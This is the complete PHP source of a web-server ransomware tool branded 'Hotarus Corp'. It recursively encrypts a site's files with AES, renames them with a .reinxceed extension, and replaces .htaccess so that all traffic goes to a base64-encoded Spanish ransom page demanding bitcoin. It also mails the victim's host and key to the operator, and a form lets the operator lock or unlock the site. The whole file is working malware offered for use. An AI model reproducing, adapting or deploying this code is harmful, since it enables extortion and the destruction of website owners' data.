<!DOCTYPE html>
<html>
<head>
   <title>Hotarus Corp - Ransomware</title>
<style type="text/css">
body {
    background: #1A1C1F;
    color: #e2e2e2;
}
.inpute{
    border-style: dotted;
    border-color: #379600;
    background-color: transparent;
    color: white;
    text-align: center;
}
.selecte{
    border-style: dotted;
    border-color: green;
    background-color: transparent;
    color: green;
}
.submite{
       border-style: dotted;
    border-color: #4CAF50;
    background-color: transparent;
    color: white;
}
.result{
  text-align: left;
}
</style>
<link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
</head>
<body>
<div class="result">
<?php
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');
class deRanSomeware
{
   public function shcpackInstall(){
    if(!file_exists(".htarein")){
      rename(".htaccess", ".htarein");
      if(fwrite(fopen('.htaccess', 'w'), "#Bug7sec Team\r\nDirectoryIndex reinxceed.php\r\nErrorDocument 404 /reinxceed.php")){
            echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i> .htaccess (Default Page)<br>';
      }
      if(file_put_contents("reinxceed.php", base64_decode("PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICAgPHRpdGxlPkhvdGFydXMgQ29ycC48L3RpdGxlPgo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPgpib2R5IHsKICAgIGJhY2tncm91bmQ6ICMwMDA7CiAgICBjb2xvcjogI2ZmZjsKfQphewogICBjb2xvcjpyZWQ7Cn0KPC9zdHlsZT4KPC9oZWFkPgo8Ym9keT4KPGNlbnRlcj4KPHByZT4KCgooICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC9AQCYmJSAgICAgICgmQCZAJiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgIC4gICAgICAgICAgICAgICAgICAgQEAmICAjQCYsICAgICAgICAgICAgICAgICAgLi4gICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgLCUmQEBAJSAgICAgICAgICAgICAgLiZAQEBAQC4gICAgICAgICAgICAgICxAQEAmJi8gICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAvQCYqICAgICAgICAlJiYmJUBALy5AQCNAJkAmLiAgICAgICAgQEAlICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgIEAmLCAgICAuJkBAICAgQEAjICAsQEAvICAlQEAsICAgICAmQC8gICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICgmQCAgIC9AQC4gIyYmJSAgICAgIChAJiYgICZAJSAgICMmJiAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAmQEBAI0BAJkBAJi4gICUmQCZAJi4gICVAQCYmJigmQEAmLiAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAoQEAmJSAgIEAmJkBAJkBAQCZAQC4gICpAJiYlICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgIC4mQCYmLiAgICZAJiUgLkBALCAmQC8gKEBAQC4gICAjQEBAKiAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICxAQEAoICAgICVAJiUgICAgQCYqICAgJiYqICAgKCZAJiAgICAsQCZAKCAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICBAJkAvICAgICpAQCYgICAgICBAJiwgICAgIEAmKiAgICAgJUBAJiAgICAuJkAmLiAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAuQEAmICAgICAmQEAqICAgICAgLkAmLCAgICAgICBAQC8gICAgICAuQEAmLiAgICAoQCYoICAgICAgICAgICAgIAogICAgICAgICAgICAgICYmQCAgICAgQEAmICAgICAgICAsQEAuICAgICAgICAgQCYlICAgICAgICAmQEAsICAgICMmJiAgICAgICAgICAgIAogICAgICAgICAgICAgQCYoICAgICZAJiAgICAgICAgICUmQEAqICAgICAgICAuQEBAQCAgICAgICAgICUmQCAgICAuJkAsICAgICAgICAgIAogICAgICAgICAgICBAQCwgICAuQEAqICAgICAgICAjQEAqICZAJiAgICAgICZAJiAuQEAmICAgICAgICAgQEAoICAgICZAKCAgICAgICAgIAogICAgICAgICAgLEAmICAgICwmQCAgICAgICAuJkBALiAgICAgJkAlICAqJkAqICAgICAmJkAvICAgICAgICYmJiAgICAmJiggICAgICAgIAogICAgICAgICAuQEAsICAgLkBALiAgICwmQEBALyAgICAgICAgIC9AQEBAJSAgICAgICAgICwmQEBAKiAgICAmQC8gICAgQEAoICAgICAgIAogICAgICAgIC4mQC4gICAgJiYmJiZAQCYsICAgICAgICAgICAgICAmQEAmLCAgICAgICAgICAgICAuJUBAQCYlQEAgICAgICZALyAgICAgIAogICAgICAgIEAmKi4jQEAmJkAlICAgICAgICAgICAgICAgICAgJiYmIyomQEAgICAgICAgICAgICAgICAgICAoJkBAJkAlLiAmQCogICAgIAogICAgICAgQCZAQCYvICAuJkAgICAgICAgICAgICAgICAgICYmQCMgICAgKkBAJi4gICAgICAgICAgICAgICAgQCYlICAqJUAmQEAuICAgIAogICAgICAgICAgICAgICAoQCYgICAgICAgICAgICAgICAmQEAmICAgICAgICAjQEBALCAgICAgICAgICAgICAgI0AmICAgICAgICAgICAgIAogICAgICAgICAgICAgICAlQCUgICAgICAgICAgICAqQEBAQCggICAgICAgICAgICZAQEAjICAgICAgICAgICAgKkAmICAgICAgICAgICAgIAogICAgICAgICAgICAgICAmJiMgICAgICAgICAgJUBALyUmIyAgICAgICAgICAgIComQCxAJkAuICAgICAgICAgLkBAICAgICAgICAgICAgIAogICAgICAgICAgICAgICBAJiMgICAgICAgL0BAJiAgIC8mJiAgICAgICAgICAgICUmJiAgICZAQCUgICAgICAgIEBAICAgICAgICAgICAgIAogICAgICAgICAgICAgICBAQCMgICAgLEAmQCogICAgICAvJkAvICAgICAgICAuJkAlICAgICAgICZAQCggICAgIEBAICAgICAgICAgICAgIAogICAgICAgICAgICAgICBAQCMgKkAmJi8gICAgICAgICAgICwmQEBAJkAmQCYmKCAgICAgICAgICAgLkAmQCMgIEBAICAgICAgICAgICAgIAogICAgICAgICAgICAgICBAQEBAQCogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLkBAQEBAICAgICAgICAgICAgIAogICAgICAgICAgICAgICAsIy4gICAgICAgICZALCAgICAgICAgICAgICAgICAgICAgICAgICZALCAgICAgICAgICgoICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8qICAgICAgICAgICAgICAoLiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMoICAgICAqQCYgICAgICAlLyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIApAKiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsJiYgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAoKVHUgc2l0aW8gZnVlIHNlY3Vlc3RyYWRvIHBvciB1biBSQU5TT01XQVJFICBkZSBIb3RhcnVzIENvcnAuIGNvbnRhY3RhIGNvbiBub3NvdHJvcyBwYXJhIHNvcG9ydGU6CiAgICAgLVsgPGZvbnQgY29sb3I9InJlZCI+aG90YXJ1c3RlYW1AcHJvdG9ubWFpbC5jb208L2ZvbnQ+IF0tCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KUXVlIGVzIHVuIDxhIGhyZWY9Imh0dHBzOi8vZW4ud2lraXBlZGlhLm9yZy93aWtpL1JhbnNvbXdhcmUiPlJhbnNvbXdhcmU8L2E+Ljxicj4KUXVpZXJlcyByZWN1cGVyYXIgdHUgc2l0aW8gd2ViPwpUaWVuZXMgcXVlIHBhZ2FyIDI1MCBEb2xhcmVzIEFtZXJpY2Fub3MgZW4gQklUQ09JTlMKTnVtZXJvIGRlIGN1ZW50YTogPGZvbnQgY29sb3I9IiNmZmNhMjUiPmJjMXE1bm00dTR3d2MzZ3FkbDczYW42eGhjanc0YzRndWQ2bTI0NHpuZTwvZm9udD4KPC9wcmU+CjwvY2VudGVyPgo8L2JvZHk+CjwvaHRtbD4="))){
            echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i>  reinxceed.php (Default Page)<br>';
      }
    }
   }
   public function shcpackUnstall(){

      if( file_exists(".htarein") ){
        if( unlink(".htaccess") && unlink("reinxceed.php") ){
          echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> .htaccess (Default Page)<br>';
          echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> reinxceed.php (Default Page)<br>';
        }
        rename(".htarein", ".htaccess");
      }

   }

   public function plus(){
      flush();
      ob_flush();
   }
   public function locate(){
        return getcwd();
    }
   public function shcdirs($dir,$method,$key){
        switch ($method) {
          case '1':
            deRanSomeware::shcpackInstall();
          break;
          case '2':
           deRanSomeware::shcpackUnstall();
          break;
        }
        foreach(scandir($dir) as $d)
        {
            if($d!='.' && $d!='..')
            {
                $locate = $dir.DIRECTORY_SEPARATOR.$d;
                if(!is_dir($locate)){
                   if(  deRanSomeware::kecuali($locate,"ReinXceed.php")  && deRanSomeware::kecuali($locate,".png")  && deRanSomeware::kecuali($locate,".htaccess")  && deRanSomeware::kecuali($locate,"reinxceed.php") &&  deRanSomeware::kecuali($locate,"index.php") && deRanSomeware::kecuali($locate,".htarein") ){
                     switch ($method) {
                        case '1':
                           deRanSomeware::shcEnCry($key,$locate);
                           deRanSomeware::shcEnDesDirS($locate,"1");
                        break;
                        case '2':
                           deRanSomeware::shcDeCry($key,$locate);
                           deRanSomeware::shcEnDesDirS($locate,"2");
                        break;
                     }
                   }
                }else{
                  deRanSomeware::shcdirs($locate,$method,$key);
                }
            }
            deRanSomeware::plus();
        }
        deRanSomeware::report($key);
   }

   public function report($key){
        $message.= "=========          Rein Xceed          =========\n";
        $message.= "Website : ".$_SERVER['HTTP_HOST'];
        $message.= "Key     : ".$key;
        $message.= "========= Rein Xceed (2020) Ransomware =========\n";
        $subject = "Report Ransomeware";
        $headers = "From: Ransomware <ransomeware@shor7cut.today>\r\n";
        mail("-- YOUR EMAIL --",$subject,$message,$headers);
   }

   public function shcEnDesDirS($locate,$method){
      switch ($method) {
        case '1':
          rename($locate, $locate.".reinxceed");
        break;
        case '2':
          $locates = str_replace(".reinxceed", "", $locate);
          rename($locate, $locates);
        break;
      }
   }

   public function shcEnCry($key,$locate){
      $data = file_get_contents($locate);
      $iv = mcrypt_create_iv(
          mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC),
          MCRYPT_DEV_URANDOM
      );

      $encrypted = base64_encode(
          $iv .
          mcrypt_encrypt(
              MCRYPT_RIJNDAEL_128,
              hash('sha256', $key, true),
              $data,
              MCRYPT_MODE_CBC,
              $iv
          )
      );
      if(file_put_contents($locate,  $encrypted )){
         echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Locked</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }else{
         echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Locked</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> '.$locate.' <br>';
      }
   }

   public function shcDeCry($key,$locate){
      $data = base64_decode( file_get_contents($locate) );
      $iv = substr($data, 0, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC));

      $decrypted = rtrim(
          mcrypt_decrypt(
              MCRYPT_RIJNDAEL_128,
              hash('sha256', $key, true),
              substr($data, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC)),
              MCRYPT_MODE_CBC,
              $iv
          ),
          "\0"
      );
      if(file_put_contents($locate,  $decrypted )){
         echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Unlock</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }else{
         echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Unlock</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }
   }



   public function kecuali($ext,$name){
        $re = "/({$name})/";
        preg_match($re, $ext, $matches);
        if($matches[1]){
            return false;
        }
            return true;
     }
}

if($_POST['submit']){
switch ($_POST['method']) {
   case '1':
      deRanSomeware::shcdirs(deRanSomeware::locate(),"1",$_POST['key']);
   break;
   case '2':
     deRanSomeware::shcdirs(deRanSomeware::locate(),"2",$_POST['key']);
   break;
}
}else{
?>
<center>
<pre>
(                                                                               
                                /@@&&%      (&@&@&                              
                 .                   @@&  #@&,                  ..              
                ,%&@@@%              .&@@@@@.              ,@@@&&/              
                     /@&*        %&&&%@@/.@@#@&@&.        @@%                   
                       @&,    .&@@   @@#  ,@@/  %@@,     &@/                    
                       (&@   /@@. #&&%      (@&&  &@%   #&&                     
                        &@@@#@@&@@&.  %&@&@&.  %@@&&&(&@@&.                     
                           (@@&%   @&&@@&@@@&@@.  *@&&%                         
                       .&@&&.   &@&% .@@, &@/ (@@@.   #@@@*                     
                    ,@@@(    %@&%    @&*   &&*   (&@&    ,@&@(                  
                  @&@/    *@@&      @&,     @&*     %@@&    .&@&.               
               .@@&     &@@*      .@&,       @@/      .@@&.    (@&(             
              &&@     @@&        ,@@.         @&%        &@@,    #&&            
             @&(    &@&         %&@@*        .@@@@         %&@    .&@,          
            @@,   .@@*        #@@* &@&      &@& .@@&         @@(    &@(         
          ,@&    ,&@       .&@@.     &@%  *&@*     &&@/       &&&    &&(        
         .@@,   .@@.   ,&@@@/         /@@@@%         ,&@@@*    &@/    @@(       
        .&@.    &&&&&@@&,              &@@&,             .%@@@&%@@     &@/      
        @&*.#@@&&@%                  &&&#*&@@                  (&@@&@%. &@*     
       @&@@&/  .&@                 &&@#    *@@&.                @&%  *%@&@@.    
               (@&               &@@&        #@@@,              #@&             
               %@%            *@@@@(           &@@@#            *@&             
               &&#          %@@/%&#            *&@,@&@.         .@@             
               @&#       /@@&   /&&            %&&   &@@%        @@             
               @@#    ,@&@*      /&@/        .&@%       &@@(     @@             
               @@# *@&&/           ,&@@@&@&@&&(           .@&@#  @@             
               @@@@@*                                        .@@@@@             
               ,#.        &@,                        &@,         ((             
                                /*              (.                              
                                #(     *@&      %/                              
@*                                     ,&&        
        HOTARUS CORP
 -[ Contact : hotarusteam@protonmail.com ]-
</pre>
<form action="" method="post" style=" text-align: center;">
      <label>Key : </label>
      <input type="text" name="key" class="inpute" placeholder="KEY ENC/DEC">
      <select name="method" class="selecte">
         <option value="1">Secuestrar</option>
         <option value="2">Liberar</option>
      </select>
      <input type="submit" name="submit" class="submite" value="Submit" />
</form>
<?php
}?>
</div>
</body>
</html>


<?php

?>